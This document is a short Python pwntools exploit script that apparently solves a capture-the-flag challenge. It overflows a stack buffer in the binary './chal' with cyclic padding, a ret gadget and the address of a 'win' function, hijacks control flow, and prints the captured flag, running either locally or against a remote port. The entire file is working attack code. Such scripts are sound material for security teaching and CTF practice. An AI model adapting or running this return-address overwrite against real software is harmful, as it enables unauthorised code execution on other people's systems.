#!/usr/bin/env python
import pwn

REMOTE_ADDR = "127.0.0.1"
REMOTE_PORT = "1337"
GADGET_RET = 0x40101a
# specific to my terminal - st
pwn.context.terminal = ["st", "-e", "sh", "-c"]

def get_challenge(elf):
    if pwn.args.REMOTE:
        chal = pwn.remote(REMOTE_ADDR, REMOTE_PORT)
    else:
        chal = pwn.process(elf.path)
    return chal

elf = pwn.ELF("./chal")
chal = get_challenge(elf)

base_padding = pwn.cyclic(pwn.cyclic_find("caab"))
exploit = (
    base_padding
  + pwn.p32(0)
  + pwn.p64(0)
  + pwn.p64(GADGET_RET)
  + pwn.p64(elf.symbols["win"])
)
chal.sendline(exploit)

chal.readuntil("Wowie!")

flag = chal.readline().strip().decode()

chal.close()

print(f"We got the flag: \"{flag}\"")
